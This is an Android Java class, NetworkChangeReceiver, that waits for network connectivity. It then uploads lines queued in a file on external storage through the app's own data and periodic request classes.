package com.inet.android.bs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;

import com.inet.android.request.DataRequest;
import com.inet.android.request.PeriodicRequest;
import com.inet.android.utils.Logging;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.util.Log;

public class NetworkChangeReceiver extends BroadcastReceiver {
	File outFile;
	File tmpFile;
	String str;
	BufferedReader fin;
	BufferedWriter fout;
	SharedPreferences sp;
	public static final String LOG_TAG = "NetworkChangeReciever";

	@Override
	public void onReceive(final Context context, final Intent intent) {
		final ConnectivityManager connMgr = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		final android.net.NetworkInfo wifi = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		final android.net.NetworkInfo mobile = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		
//		RequestMakerImpl req = new RequestMakerImpl(context);
		StringBuilder sendStrings = new StringBuilder(); 
		String funcRecStr = null;
		
		Logging.doLog(LOG_TAG, "NetWorkChange - begin", "NetWorkChange - begin");
	
		if (wifi.isAvailable() || mobile.isConnectedOrConnecting()) {
			Logging.doLog(LOG_TAG, "NetWorkChange - available", "NetWorkChange - available");
		
			outFile = new File(Environment.getExternalStorageDirectory(),
					"/conf");
			if (outFile.exists() == false) {
				Logging.doLog(LOG_TAG, "out file no exist", "out file no exist");
				return;
			}
			if (outFile.length() == 0) {
				Logging.doLog(LOG_TAG, "out file empty", "out file empty");
				return;
			}
			if (outFile.length() == 1){
				outFile.delete();
				Logging.doLog(LOG_TAG, "out file consist /n", "out file consist /n");
				return;
			}
			tmpFile = new File(Environment.getExternalStorageDirectory(),
					"/tmpSendFile.txt");

			try {
				fin = new BufferedReader(new InputStreamReader(
						new FileInputStream(outFile)));
				try {
					fout = new BufferedWriter(new FileWriter(tmpFile));
				} catch (IOException e) {
					e.printStackTrace();

				}
			} catch (FileNotFoundException e) {
				e.printStackTrace();
				return;
			}
			try {
				String lineToRemove = null;
				while ((str = fin.readLine()) != null && str.length() >= 7) {
					Logging.doLog(LOG_TAG, "SendFile: " + str, "SendFile: " + str);
					
					if (str.substring(0, 6).equals("<func>")) {
						funcRecStr = str;
						Log.d("request func", str);
					} else {
						sendStrings.append(str);
					}
					lineToRemove = str;
					String trimmedLine = str.trim();
					if (trimmedLine.equals(lineToRemove))
						continue;
					fout.write(str);

				}
				if (funcRecStr != null) {
//					req.sendPeriodicRequest(funcRecStr);
					PeriodicRequest pr = new PeriodicRequest(context);
					pr.sendRequest(funcRecStr);
				}
//				req.sendDataRequest(sendStrings.toString());
				DataRequest dr = new DataRequest(context);
				dr.sendRequest(sendStrings.toString());
				Logging.doLog("sendFile Buffer", sendStrings.toString(), sendStrings.toString());
			
				boolean successful = tmpFile.renameTo(outFile);

				Logging.doLog("networkchange", "Rename file:" + Boolean.toString(successful), "Rename file:" + Boolean.toString(successful));
			} catch (IOException e) {
				e.printStackTrace();
				return;
			}
			try {
				fin.close();
				fout.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			Logging.doLog(LOG_TAG, "without inet", "without inet");
		}
	}

}
